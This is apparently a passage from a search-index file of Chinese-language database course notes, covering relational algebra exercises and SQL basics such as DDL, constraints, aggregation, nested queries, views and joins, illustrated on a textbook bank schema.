<p>\u5176\u601d\u8def\u4e3a\u5148\u628a\u6240\u6709\u975e\u6700\u5927\u503c\u7684 balance \u627e\u51fa\u6765\uff0c\u518d\u7528\u539f\u6765\u7684\u8868\u505a\u96c6\u5408\u5dee\u627e\u5230\u6700\u5927\u503c\u3002</p> <p>Ex6. Find all customers who have an account at all branches located in Brooklyn city</p> <p>\u67e5\u8be2\u6240\u6709\u6ee1\u8db3\u5728 Brooklyn \u5e02\u4e2d\u7684\u6240\u6709\u5206\u884c\u62e5\u6709\u5b58\u6b3e\u8d26\u5355\u7684\u5ba2\u6237\u540d\uff1a</p> \\[\\begin{array}l \\Pi _{customer-name, branch-name}(depositor \\bowtie account) \\div \\\\ \\Pi_{branch-name}( \\sigma_{branch-city='Brooklyn'}(branch)) \\end{array} \\] <p>Ex7. Delete all loan records with amount in the range of 0 to 50</p> <p>\u5220\u9664\u6240\u6709\u8d37\u6b3e\u91d1\u989d\u5c0f\u4e8e 50 \u7684\u8d37\u6b3e\u8bb0\u5f55\uff1a</p> \\[ load \\leftarrow loan- \\sigma_{amount \\ge 0\\ and\\ amount \\le 50}(loan) \\] <p>Ex8. Insert information in the database specifying that Smith has $1200 in account A-973 at the Perryridge branch</p> <p>\u63d2\u5165\u4e00\u6761\u4fe1\u606f\uff0cSmith \u5728 Perryridge \u5206\u884c\u5b58\u50a8\u4e86 $1200\uff0c\u5b58\u6b3e\u53f7\u4e3a A-973\uff1a </p> \\[ \\begin{array}l account \\leftarrow account \\cup \\{('Perryridge', A\\_973, 1200)\\} \\\\ depositor\\leftarrow depositor \\cup \\{('Smith', A\\_973)\\} \\end{array} \\] <p>Ex8. Pay all accounts with balances over $10,000 6 percent interest and pay all others 5 percent</p> <p>\u4e3a\u6240\u6709\u8d26\u6237\u5b58\u6b3e\u5206\u53d1\u5e74\u5229\u6da6\uff0c\u8981\u6c42\u5927\u4e8e $10000 \u7684\u6709 6% \u5229\u6da6\uff0c\u5176\u5b83 5%\uff1a</p> \\[ \\begin{array}l account\\leftarrow &amp; \\Pi_{ account\\_number, branch\\_name, balance * 1.06}(\\sigma_{balance \\gt 10000}(account)) \\\\ &amp; \\cup \\Pi_{ account\\_number, branch\\_name, balance * 1.05}( \\sigma_{balance \\le 10000}(account)) \\end{array} \\] <p>\u5728\u5927\u90e8\u5206 DBMS \u4e2d '-' \u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u56e0\u6b64\u8981\u6539\u4e3a\u4e0b\u5212\u7ebf '_'</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u7279\u6b8a\u7684 Relational-Algebra Operators\uff0c\u53eb\u505a Aggregate Functions(\u805a\u5408\u51fd\u6570)\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u4e3a\uff1a</p> \\[ _{G_1 ,G_2,..., G_n} g_{F_1( A_1), F_2( A_2),..., F_n( A_n)}(E) \\] <p>\u5176\u4e2d \\(G_n\\) \u4e3a\u8981 group \u7684 attribute \u540d\uff0c\\(F_n( A_n)\\) \u4e3a\u8981\u5bf9\u67d0\u4e00\u5c5e\u6027\u8fdb\u884c\u7684\u805a\u5408\u51fd\u6570\u64cd\u4f5c\uff0c\u5305\u62ec\uff1a</p> <ul> <li>avg: average value</li> <li>min: minimum value</li> <li>max: maximum value</li> <li>sum: sum of values</li> <li>count: number of values</li> </ul> Aggregate Function Example <p></p>"},{"location":"Courses/DB/SQL/","title":"SQL","text":""},{"location":"Courses/DB/SQL/#sql","title":"SQL","text":"<p> \u7ea6 2707 \u4e2a\u5b57  157 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>\u4e00\u5b9a\u8981\u8bb0\u4f4f\u67e5\u8be2\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\uff0c\u624d\u80fd\u7406\u6e05\u903b\u8f91</p> \\[from\\rightarrow where \\rightarrow group(aggregate)\\rightarrow having \\rightarrow select \\rightarrow order\\ by\\]"},{"location":"Courses/DB/SQL/#overview","title":"Overview","text":"<p>SQL(Sequel)\u662f\u4e00\u4e2a\u8bed\u8a00\u89c4\u8303\uff0c\u6700\u521d\u7531 IBM \u8bbe\u8ba1\u3002\u4e0d\u8fc7\u5f88\u591a DBMS \u5e76\u4e0d\u4f1a\u5b8c\u5168\u6309\u7167\u89c4\u8303\u8bbe\u8ba1\u5b83\u4eec\u7684\u8bed\u8a00\uff0c\u6bcf\u4e2a\u4eba\u90fd\u60f3\u8981\u5c06\u5b83\u4eec\u7684 feature \u52a0\u5165 SQL \u540e\u7eed\u7684\u66f4\u65b0\u4e2d\u3002</p> <p>\u6211\u4e0d\u60f3\u6211\u7684 SQL \u8bed\u53e5\u80fd\u88ab\u522b\u7684\u5382\u5546\u76f4\u63a5\u4f7f\u7528\uff08\uff09</p> <p>\u6309\u7167\u6807\u51c6\u7b26\u5408\u5ea6(Conformance Levels)\uff0c\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff1a</p> <ul> <li>Entry Level SQL \u5165\u95e8\u7ea7</li> <li>Transitional SQL \u8fc7\u6e21\u7ea7</li> <li>Intermediate SQL \u4e2d\u95f4\u7ea7</li> <li>Full SQL \u5b8c\u5168\u7ea7</li> </ul> <p>\u5230\u4e86\u73b0\u5728\uff0c\u5df2\u7ecf\u6ca1\u6709 DBMS \u4ea7\u54c1\u4f1a\u5b9e\u73b0 FULL LEVEL \u7684\u6807\u51c6\u7b26\u5408\u5ea6\u4e86\u3002</p> <p>\u4f5c\u4e3a\u4e00\u4e2a\u5173\u7cfb\u578b\u8bed\u8a00\uff0cSQL \u4e3b\u8981\u7531\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u9762\u7ec4\u5408\u800c\u6210\uff1a</p> <ul> <li>Data Manipulation Language (DML)<ul> <li>\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff0c\u5373\u68c0\u7d22\u6570\u636e\u6216\u4fee\u6539\u6570\u636e\u7684\u547d\u4ee4</li> <li><code>select ... from ...</code></li> <li><code>insert</code>, <code>delete</code>, <code>update</code></li> </ul> </li> <li>Data Defination Language (DDL)<ul> <li>\u6570\u636e\u5b9a\u4e49\u8bed\u8a00\uff0c\u53ef\u6d89\u53ca\u5230\u7d22\u5f15\u3001\u547d\u540d\u7a7a\u95f4\u3001\u89e6\u53d1\u5668\u3001\u51fd\u6570\u7b49\uff0c\u901a\u5e38\u4e3a\u6570\u636e\u5e93\u58f0\u660e\u5143\u6570\u636e</li> <li><code>create table</code>, <code>alter table</code>, <code>drop table</code></li> <li><code>create index</code>, <code>drop index</code></li> <li><code>create view</code>, <code>drop view</code></li> <li><code>create trigger</code>, <code>drop trigger</code></li> </ul> </li> <li>Data Control Language (DCL)<ul> <li>\u6570\u636e\u63a7\u5236\u8bed\u8a00\uff0c\u5173\u4e8e\u5b89\u5168\u548c\u7c7b\u4f3c\u5185\u5bb9\u7684\u89c4\u8303</li> <li><code>grant</code>, <code>revoke</code></li> </ul> </li> </ul> <p></p>"},{"location":"Courses/DB/SQL/#data-definition-language","title":"Data Definition Language","text":"<p>\u4e00\u4e2a\u5178\u578b\u7684 DDL \u8bed\u53e5\u5982\u4e0b\uff1a</p> <pre><code>CREATE TABLE branch\n            (branch_name char(15) not null,\n            branch_city  varchar(30),\n            assets       numeric(8,2),\n            primary key(branch_name),\n            foreign key(...) references ...(...))\n</code></pre> <p>SQL \u7684 Domain Type \u5927\u4f53\u6709\u4ee5\u4e0b\u51e0\u7c7b\uff1a</p> <ul> <li><code>char(n)</code>: \u7528\u6237\u6307\u5b9a\u7684\u5b9a\u957f\u5b57\u7b26\u4e32<ul> <li>C\u8bed\u8a00\u4e2d\u5b57\u7b26\u4e32\u4e00\u5b9a\u4ee5 0 \u7ed3\u5c3e\uff0c\u4f46\u662f DB \u4e2d\u5e76\u4e0d\u9700\u8981</li> </ul> </li> <li><code>varchar(n)</code>: \u7528\u6237\u6307\u5b9a\u6700\u5927\u957f\u5ea6\u7684\u53ef\u53d8\u957f\u5ea6\u5b57\u7b26\u4e32</li> <li><code>int</code>: \u6574\u6570\uff0c\u6839\u636e\u673a\u5668\u7684\u4e0d\u540c\u6307\u5b9a\u7684\u8303\u56f4\u4e0d\u540c</li> <li><code>smallint</code>: \u6574\u6570\uff0c\u6bd4 <code>int</code> \u8303\u56f4\u66f4\u5c0f</li> <li><code>numeric(p,d)</code>: Fixed Point Number\uff0cp \u8868\u793a\u6709\u6548\u6570\u5b57\u4f4d\u6570\uff0cd \u8868\u793a\u5c0f\u6570\u70b9\u540e\u591a\u5c11\u4f4d<ul> <li>\u4f8b\u5982\uff0c<code>numeric(3,1)</code> \u5141\u8bb8 44.5\uff0c\u4f46\u4e0d\u5141\u8bb8 444.5 \u6216\u8005 0.32</li> </ul> </li> <li><code>real, double</code>: \u6d6e\u70b9\u6570\uff0c\u6839\u636e\u673a\u5668\u7684\u4e0d\u540c\u7cbe\u5ea6\u4e0d\u540c</li> <li><code>float(n)</code>: \u6d6e\u70b9\u6570\uff0c\u7531\u7528\u6237\u6307\u5b9a\u6700\u5c0f\u7cbe\u5ea6</li> <li><code>null values</code>: \u7a7a</li> <li><code>date</code>: \u5305\u542b\u5e74(4 digit)\u3001\u6708\u3001\u65e5<ul> <li>E.g. <code>2007-2-27</code></li> </ul> </li> <li><code>time</code>: Time of day, in hours, minutes, and seconds<ul> <li>E.g. <code>11:18:16</code> or <code>11:18:16.28</code></li> </ul> </li> <li><code>timestamp</code>: \u65f6\u95f4\u6233\uff0c\u901a\u5e38\u662f Data + Time<ul> <li>E.g. <code>2007-2-27 11:18:16.28</code></li> </ul> </li> <li>Large Object Types\uff0c\u7528\u6765\u5b58\u50a8\u5927\u6587\u4ef6\uff0c\u5982 <code>blob(20MB)</code><ul> <li><code>blob</code>: Binary Large Object</li> <li><code>clob</code>: Character Large Object</li> </ul> </li> </ul> <p>SQL \u6709\u8bb8\u591a\u51fd\u6570\u7528\u6765\u5904\u7406\u5404\u79cd\u7c7b\u578b\u7684\u6570\u636e\u53ca\u5176\u7c7b\u578b\u8f6c\u6362\uff0c\u4f46\u5404\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\u51fd\u6570\u7684\u6807\u51c6\u5316\u7a0b\u5ea6\u4e0d\u9ad8</p> <p>\u9664\u4e86\u5728 <code>CREATE</code> \u8bed\u53e5\u4e2d\u6307\u5b9a Domain Type \u5916\uff0c\u8fd8\u9700\u8981\u52a0\u5165\u5fc5\u8981\u7684 Integrity Constraints \u6765\u786e\u4fdd\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\uff1a</p> <ul> <li><code>not null</code>: \u8981\u6c42\u975e\u7a7a</li> <li><code>default</code>: \u8bbe\u5b9a\u7f3a\u7701\u503c</li> <li><code>check(p)</code>: \u68c0\u6d4b\u8c13\u8bcd p \u662f\u5426\u6210\u7acb</li> <li><code>Primary Key(A1, A2,...)</code>: \u62ec\u53f7\u5185\u4e0d\u80fd\u4e3a\u7a7a\u3001\u4e0d\u80fd\u6709\u91cd\u590d Keys</li> <li><code>Foreign Key(A1, A2,...) references r</code>: \u5f15\u7528\u5bf9\u5e94\u8868\u7684\u4e3b\u952e</li> </ul> <pre><code>CREATE table account(\n    ...\n    FOREIGN KEY(branch_name) REFERENCES branch(branch_name)\n        -- \u5728\u8fdd\u53cd referential integrity \u7684\u60c5\u51b5\u4e0b\uff1a\n        [on delete cascade] -- branch\u5220\u4e86\uff0c\u5219\u540c\u65f6\u5220\u6389account\n        [on update cascade] -- branch\u66f4\u65b0\uff0c\u5219\u540c\u65f6\u66f4\u65b0account\n)\n</code></pre> <p>Referential Integrity \u7684\u68c0\u6d4b\u53ea\u5728\u4e00\u4e2a\u4e8b\u52a1\u7ed3\u675f\u65f6\u8fdb\u884c\uff0c\u56e0\u6b64\u4e8b\u52a1\u4e2d\u95f4\u53ef\u4ee5\u6682\u65f6\u8fdd\u53cd</p> <p>SQL \u8fd8\u652f\u6301\u7528\u6237\u81ea\u5b9a\u4e49 Types \u6216 Domain\uff1a</p> <pre><code>-- CREATE NEW TYPE\nCREATE type person_name AS varchar(20)\nCREATE table student(sno char(10) PRIMARY KEY,\n                     sname person_name\n);\nDROP type person_name\n\n-- CREATE NEW DOMAIN\nCREATE domain Dollars AS numeric(12, 2) NOT NULL\nCREATE table employee(eno char(10) PRIMARY KEY,\n                      salary Dollars\n)\n</code></pre> <p>\u533a\u522b\u5728\u4e8e\uff0c<code>DOMAIN</code> \u5141\u8bb8\u6dfb\u52a0\u7ea6\u675f</p> <pre><code>-- \u5b8c\u5168\u5220\u9664 Relation branch\nDROP TABLE branch;\n\n-- \u4e3a loan \u6dfb\u52a0\u65b0\u5c5e\u6027 loan_date\n-- \u6240\u6709\u65b0\u589e\u5c5e\u6027\u7684\u521d\u59cb\u503c\u5747\u4e3a null\nALTER TABLE loan ADD loan_date date;\n\n-- \u5220\u9664 loan_date \u5c5e\u6027\n-- \u5f88\u591a DBMS \u4e0d\u652f\u6301\u8fd9\u4e00\u529f\u80fd\nALTER TABLE loan DROP loan_date\n\n-- \u8c03\u6574\u5c5e\u6027\u7684 domain\nALTER TABLE branch MODIFY(branch_name char(30), assets not null)\n</code></pre> <p>\u4e0d\u8981\u8f7b\u6613\u4f7f\u7528 DROP \u6307\u4ee4\uff0cDELETE \u8d77\u7801\u8fd8\u4f1a\u628a SCHEMA \u7559\u4e0b\u6765\uff0cDROP \u4e86\u4ec0\u4e48\u90fd\u6ca1\u4e86</p> <pre><code>CREATE INDEX index_user_id ON user_t (user_id)\n</code></pre> <p>\u5728\u4e0d\u8bfb\u53d6\u6574\u4e2a\u8868\u7684\u60c5\u51b5\u4e0b\uff0c\u7d22\u5f15\u4f7f\u5f97\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u66f4\u5feb\u67e5\u627e\u6570\u636e\uff0c\u5e76\u4e14\u662f\u7528\u6237\u4e0d\u53ef\u89c1\u7684\u3002</p> <p>\u7531\u4e8e\u7d22\u5f15\u672c\u8eab\u4e5f\u9700\u8981\u66f4\u65b0\uff0c\u66f4\u65b0\u4e00\u4e2a\u5e26\u7d22\u5f15\u7684\u8868\u8981\u6bd4\u6ca1\u6709\u7d22\u5f15\u7684\u540c\u4e00\u8868\u6d88\u8017\u66f4\u591a\u65f6\u95f4\uff0c\u56e0\u6b64\uff0c\u7406\u60f3\u7684\u505a\u6cd5\u662f\u53ea\u5728\u5e38\u5e38\u88ab\u641c\u7d22\u7684 Column \u4e0a\u5efa\u7acb\u7d22\u5f15\u3002</p> <p>To Drop an index</p> <pre><code>DROP INDEX index_user_id ON user_t\n</code></pre>"},{"location":"Courses/DB/SQL/#basic-structure","title":"Basic Structure","text":"<pre><code>SELECT A1, A2, ..., An\nFROM r1, r2, ..., rm\nWHERE P\n</code></pre> <p>\u7b49\u4ef7\u4e8e\u903b\u8f91\u4ee3\u6570\uff1a</p> \\[ \\Pi_{ A_1, A_2,..., A_n}( \\sigma_{ P} (r_1 \\times r_2 \\times ... \\times r_n)) \\] <p>SQL \u5141\u8bb8 Relation \u4e2d\u51fa\u73b0\u91cd\u590d\u5143\u7ec4\uff0c\u4f7f\u7528 <code>distinct</code> \u5173\u952e\u5b57\u6765\u5f3a\u5236\u7b5b\u9009</p> <pre><code>SELECT DISTINCT branch_name FROM loan;\nSELECT ALL branch_name FROM loan; -- \u9ed8\u8ba4\u4e0d\u52a0\u5c31\u662f all\n</code></pre> <pre><code>SELECT customer_name, borrower.loan_number as loan_id\nFROM borrower, loan\nWHERE borrower.loan_number = loan.loan_number;\n</code></pre> <p>\u5728 SQL Server \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b49\u4e8e\u53f7\u6765\u4ee3\u66ff\u4e0a\u5f0f\u7684 <code>as</code></p> <p>SQL \u8fd8\u63d0\u4f9b String-Matching Operator\uff0c\u901a\u5e38\u5728 <code>where</code> \u8bed\u53e5\u4e2d\u4f7f\u7528 <code>LIKE</code> \u8fd0\u7b97\u7b26\uff1a</p> <ul> <li><code>%</code> : \u5339\u914d\u4efb\u610f\u5b57\u4e32</li> <li><code>_</code> : \u5339\u914d\u4efb\u610f\u5355\u5b57\u7b26</li> </ul>"},{"location":"Courses/DB/SQL/#set-operations","title":"Set Operations","text":"<p>\u5728 SQL \u4e2d\uff0c\u96c6\u5408\u64cd\u4f5c\u6709 <code>UNION</code>, <code>INTERSECT</code>, <code>EXCEPT</code>\uff0c\u5206\u522b\u5bf9\u5e94\u7740\u5e76\u96c6 \\(\\cup\\)\uff0c\u4ea4\u96c6 \\(\\cap\\)\uff0c\u4ee5\u53ca\u5dee\u96c6 \\(-\\)\u3002\u4e0e\u5176\u4ed6\u64cd\u4f5c\u4e0d\u540c\u7684\u662f\uff0cset operations \u4f1a\u81ea\u52a8\u9690\u53bb\u91cd\u590d\u7684\u5143\u7d20\uff0c\u5982\u679c\u6211\u4eec\u60f3\u4fdd\u7559\u91cd\u590d\u5143\u7ec4\uff0c\u5219\u9700\u4f7f\u7528 <code>UNION ALL</code> \u7b49\u5173\u952e\u5b57\u3002</p> <p>Suppose a tuple occurs m times in r and n times in s, then it occurs:</p> <ul> <li>\\(m+n\\) times in <code>r UNION ALL s</code></li> <li>\\(\\min (m,n)\\) times in <code>r INTERSECT ALL s</code></li> <li>\\(\\max (0, m-n)\\) times in <code>r EXCEPT ALL s</code></li> </ul> <p>Example. Find all customers who have an account but no loan.</p> <pre><code>(SELECT customer_name FROM depositor)\nEXCEPT\n(SELECT customer_name FROM borrower)\n</code></pre> <p>\u6ce8\u610f\u4e0d\u540c DBMS \u4e4b\u95f4\u5dee\u522b\uff0c\u4f8b\u5982 Oracle \u4f7f\u7528 <code>MINUS</code> \u4ee3\u66ff <code>EXCEPT</code>\uff0cSQL Server 2000 \u53ea\u652f\u6301 <code>UNION</code> \u548c <code>UNION ALL</code> \u7b49</p>"},{"location":"Courses/DB/SQL/#aggregate-functions","title":"Aggregate Functions","text":"<p>\u5e26\u805a\u5408\u51fd\u6570\u7684 <code>SELECT</code> \u4e4b\u540e\u53ea\u80fd\u8ddf\u7740 <code>GROUP BY</code> \u5b50\u53e5\u4e2d\u7684\u5c5e\u6027\u6216\u8005\u805a\u5408\u51fd\u6570</p> <p>Example. Find the average account balance for each branch</p> <pre><code>SELECT branch_name, avg(balance) AS avg_bal\nFROM account\nGROUP BY branch_name\n</code></pre> <p>\u7531\u4e8e <code>WHERE</code> \u7684\u8ba1\u7b97\u987a\u5e8f\u6bd4\u805a\u5408\u51fd\u6570\u524d\uff0c\u6240\u6709\u5f53\u6267\u884c <code>WHERE</code> \u5224\u65ad\u65f6\u805a\u5408\u51fd\u6570\u8fd8\u6ca1\u6709\u5f97\u5230\u7ed3\u679c\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u80fd\u5728 <code>WHERE</code> \u4e2d\u52a0\u5165\u805a\u5408\u51fd\u6570\u3002\u76f8\u5bf9\u7684\uff0c\u6211\u4eec\u4f7f\u7528 <code>HAVING</code> \u5173\u952e\u5b57\u6765\u4f5c\u4e3a\u4ee3\u66ff\uff1a</p> <p>Example. Find the names of all branches located in city Brooklyn where the average account balance is more than $1,200</p> <pre><code>SELECT A.branch_name, avg(balance)\nFROM account AS A, branch AS B\nWHERE A.branch_name = B.branch_name AND\n    branch_city = 'Brooklyn'\nGROUP BY A.branch_name\nHAVING avg(balance) &gt; 1200;\n</code></pre> <p>\u9664\u4e86 <code>COUNT(*)</code> \u7684\u805a\u5408\u51fd\u6570\u9ed8\u8ba4\u5ffd\u7565 Null Values\uff0c\u9664\u975e\u8be5\u503c\u5168\u90e8\u4e3a <code>null</code>\uff0c\u6b64\u65f6\u4e5f\u4f1a\u8fd4\u56de <code>null</code>\u3002</p> <p>Null Values</p> <p>\u4efb\u610f\u5e26 <code>null</code> \u7684\u7b97\u672f\u8ba1\u7b97\u7ed3\u679c\u90fd\u662f <code>null</code>\uff0c\u4efb\u610f\u5e26 <code>null</code> \u7684\u903b\u8f91\u6bd4\u8f83\u7ed3\u679c\u90fd\u662f <code>unknown</code>\u3002\u6b64\u5916\uff0c\u4e09\u79cd\u5e26 <code>unknown</code> \u7684\u903b\u8f91\u8ba1\u7b97\u7ed3\u679c\u4e3a\uff1a </p> <p>\u540c\u65f6\uff0c\u4f5c\u4e3a <code>WHERE</code> \u5b50\u53e5\u4e2d\u7684\u8c13\u8bcd\uff0c\u9700\u8981\u4f7f\u7528 <code>WHERE amount is not null</code> \u7684\u5f62\u5f0f\u6765\u5224\u65ad null values\uff0c\u800c\u4e0d\u80fd\u76f4\u63a5\u7528\u7b49\u4e8e\u53f7\u3002<code>WHERE</code> \u6700\u7ec8\u7ed3\u679c\u5982\u679c\u4e3a <code>unknown</code>\uff0c\u4e5f\u5f53\u4f5c <code>false</code> \u5904\u7406\u3002</p> <p>\u5173\u952e\u5b57 <code>rollup</code></p> <p><code>group by rollup(A,B,C)</code> \u80fd\u591f\u81ea\u52a8\u751f\u6210\u591a\u7ea7\u522b\u7684\u6c47\u603b\u6570\u636e\uff1a</p> <ul> <li>\u6309 (A, B, C) \u5206\u7ec4\uff0c\u8ba1\u7b97\u6700\u8be6\u7ec6\u7684\u5206\u7ec4\u7edf\u8ba1\u3002</li> <li>\u6309 (A, B) \u5206\u7ec4\uff0c\u5ffd\u7565 C\uff0c\u8ba1\u7b97 B \u7ea7\u522b\u7684\u6c47\u603b\u3002</li> <li>\u6309 (A) \u5206\u7ec4\uff0c\u5ffd\u7565 B \u548c C\uff0c\u8ba1\u7b97 A \u7ea7\u522b\u7684\u6c47\u603b\u3002</li> <li>\u6574\u4f53\u6c47\u603b\uff0c\u4e0d\u6309\u4efb\u4f55\u5217\u5206\u7ec4\uff0c\u8ba1\u7b97\u5168\u5c40\u7edf\u8ba1\u3002</li> </ul> \u5bf9\u4ee5\u4e0b\u8868\u6267\u884c\u4ee5\u4e0b SQL \u8bed\u53e5 <p></p> <pre><code>SELECT building, room_number, time_slot_id, COUNT(*)\nFROM r\nGROUP BY ROLLUP (building, room_number, time_slot_id);\n</code></pre> <p>\u5f97\u5230\u7ed3\u679c\uff1a</p> <p></p>"},{"location":"Courses/DB/SQL/#nested-query","title":"Nested Query","text":"<p>\u6211\u4eec\u77e5\u9053 <code>FROM</code> \u751a\u81f3 <code>WHERE</code> \u5b50\u53e5\u4e2d\u90fd\u53ef\u4ee5\u4ee5\u4e00\u5f20\u8868\u4f5c\u4e3a\u5bf9\u8c61\uff0c\u800c\u6211\u4eec <code>SELECT</code> \u8bed\u53e5\u5f97\u5230\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u5f20\u8868\uff0c\u56e0\u6b64\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u8fdb\u884c\u5d4c\u5957\u67e5\u8be2\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\uff1a</p> <pre><code>SELECT distinct customer_name\nFROM borrower\nWHERE customer_name not in (SELECT customer_name\n                            FROM depositor);\n</code></pre> <p>\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u60f3\u67e5\u627e\u5404\u4e2a branch \u4e2d balance \u6700\u5927\u7684\u8d26\u6237\uff0c\u8be5\u5982\u4f55\u6784\u9020\u5d4c\u5957\u67e5\u8be2\uff1f</p> <pre><code>SELECT account_number AS AN, balance\nFROM account AS A\nWHERE balance &gt;= (SELECT max(balance)\n                 FROM account AS B\n                 WHERE A.branch_name = B.branch_name)\nORDER BY balance\n</code></pre> <p>\u5206\u6790\u8bed\u5e8f\uff0c\u6b64\u5904\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e24\u5c42\u5d4c\u5957\u5faa\u73af\uff0c\u5148\u4ece\u5916\u5c42 <code>A</code> \u53d6\u51fa\u4e00\u4e2a <code>branch_name</code>\uff0c\u7136\u540e\u627e\u51fa\u5185\u5c42\u6240\u6709\u76f8\u540c <code>branch_name</code> \u7684\u5143\u7ec4\uff0c\u8ba1\u7b97\u6700\u5927\u503c\uff0c\u518d\u56de\u5230\u5916\u5c42\u8fdb\u884c\u6bd4\u8f83\u3002\u8fd9\u6837\u552f\u4e00\u7b26\u5408\u7684\u7ed3\u679c\u5c31\u662f\u8be5 <code>branch_name</code> \u4e2d balance \u6700\u5927\u7684\u8d26\u6237\u4e86\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cSQL \u8fd8\u6709\u4e00\u79cd set comparison\uff0c\u5206\u522b\u662f <code>SOME</code> \u548c <code>ALL</code> \u5173\u952e\u8bcd\uff1a</p> SOMEALL <p></p> <p></p>"},{"location":"Courses/DB/SQL/#view","title":"VIEW","text":"<p>VIEW \u5e76\u4e0d\u5360\u7528\u5b9e\u9645\u7a7a\u95f4\uff0c\u662f\u4e00\u5f20\u66f4\u65b9\u4fbf\u67e5\u770b\u7684\u903b\u8f91\u8868\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u88ab\u5f53\u4f5c\u6b63\u5e38\u8868\u6765\u8bbf\u95ee\uff08\u4ee5\u53ca\u5d4c\u5957\u67e5\u8be2\uff09\u3002</p> <p>\u4e0b\u9762\u7684 SQL Server \u8bed\u53e5\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u4e8e\u7edf\u8ba1\u5404\u4e2a\u7528\u6237\u7684\u8d34\u6570\u7684 VIEW\uff1a</p> <pre><code>CREATE VIEW post_number AS\n(SELECT user_id, COUNT(post_id) AS post_count\nFROM posts GROUP BY user_id);\n</code></pre> <p>\u4f7f\u7528 <code>DROP VIEW &lt;V_NAME&gt;</code> \u6765\u5220\u9664 VIEW</p> <p>\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u5bf9 VIEW \u8fdb\u884c Modification\uff0cDBMS \u4f1a\u5c3d\u53ef\u80fd\u5c06\u5176\u201c\u7ffb\u8bd1\u201d\u4e3a\u5bf9\u57fa\u8868\u7684\u64cd\u4f5c\u3002\u4f46\u6211\u4eec\u5c3d\u91cf\u4e0d\u8981\u8fd9\u4e48\u505a\u3002\u53ea\u6709\u884c\u5217\u89c6\u56fe\u53ef\u4ee5\u66f4\u65b0\u6570\u636e\u3002</p> <p>\u884c\u5217\u89c6\u56fe</p> <p>\u5efa\u7acb\u5728\u5355\u4e2a\u57fa\u672c\u8868\u4e0a\u7684\u89c6\u56fe\uff0c\u4e14\u89c6\u56fe\u7684\u5217\u5bf9\u5e94\u8868\u7684\u5217\uff0c\u79f0\u4e3a\u884c\u5217\u89c6\u56fe\u3002</p> <p>\u901a\u8fc7 <code>WITH</code> \u5173\u952e\u5b57\uff0c\u6211\u4eec\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a LOCAL VIEW\uff0c\u4f7f\u5f97\u5d4c\u5957\u67e5\u8be2\u53d8\u5f97\u66f4\u52a0\u7f8e\u89c2\uff1a</p> <pre><code>-- Find all account with maximum balance\nWITH max_balance(value) AS\n    SELECT max(balance)\n    FROM account\nSELECT account_number\nFROM account, max_balance  -- USE LOCAL VIEW\nWHERE account.balance = max_balance.value\n</code></pre>"},{"location":"Courses/DB/SQL/#modification","title":"Modification","text":"<p>Modification \u5373\u6211\u4eec\u719f\u8bc6\u7684\u589e\u5220\u6539 <code>INSERT</code>, <code>DELETE</code>, <code>UPDATE</code>:</p> <pre><code>-- \u63d2\u5165\ninsert into table_name values();\n\n-- \u5220\u9664\ndelete from table_name where P;\n\n-- \u4fee\u6539\nupdate r\nset attribute = ...\nwhere P\n\n-- \u4fee\u6539(case)\nupdate r\nset attribute = case\n    when ... then ...\n    when ... then ...\n    ...\n    else ...\nend\n</code></pre> <p>\u4f7f\u7528\u805a\u5408\u51fd\u6570\u548c <code>CASE</code> \u5b9e\u73b0\u884c\u5217\u4e92\u6362</p> <p></p>"},{"location":"Courses/DB/SQL/#join-operation","title":"Join Operation","text":"<p>\u8fde\u63a5\u64cd\u4f5c\u662f\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u53ef\u4ee5\u5206\u4e3a\u81ea\u7136\u8fde\u63a5\u548c\u975e\u81ea\u7136\u8fde\u63a5\u4e24\u7c7b\uff0c\u533a\u522b\u5728\u4e8e Natural \u81ea\u52a8\u4ee5\u540c\u540d\u5c5e\u6027\u76f8\u7b49\u4f5c\u4e3a\u8fde\u63a5\u6761\u4ef6\uff0c\u800c\u975e\u81ea\u7136\u8fde\u63a5\u53ef\u4ee5\u4f7f\u7528 <code>ON</code>\u6216<code>USING</code> \u5173\u952e\u5b57\u81ea\u5b9a\u4e49\u6761\u4ef6\uff1a</p> <pre><code>-- \u81ea\u7136\u8fde\u63a5\nR NATURAL {INNER JOIN, LEFT JOIN, RIGHT JOIN, FULL JOIN} S\n\n-- \u975e\u81ea\u7136\u8fde\u63a5\nR {INNER JOIN, LEFT JOIN, RIGHT JOIN, FULL JOIN} ON &lt;condition&gt;\n                                                 USING &lt;columns&gt;\n</code></pre> <p>\u5916\u8fde\u63a5\uff08\u975e <code>INNER JOIN</code>\uff09\u5982\u679c\u627e\u4e0d\u5230\u5bf9\u5e94\u7684\u8fde\u63a5\u5bf9\u5e94\u5173\u7cfb\uff0c\u4e5f\u8981\u52a0\u5165\u5230\u7ed3\u679c\u4e2d\uff1a</p> <p></p> <p>\u4f7f\u7528 <code>ON</code> \u7684\u975e\u81ea\u7136\u8fde\u63a5\u5141\u8bb8\u4e0d\u540c\u540d\u5c5e\u6027\u7684\u6bd4\u8f83\uff0c\u540c\u65f6\u7ed3\u679c\u4e0d\u6d88\u53bb\u540c\u540d\u5c5e\u6027</p> <p></p> <p>Example. Find all customers who have either an account or a loan (but not both) at the bank</p> 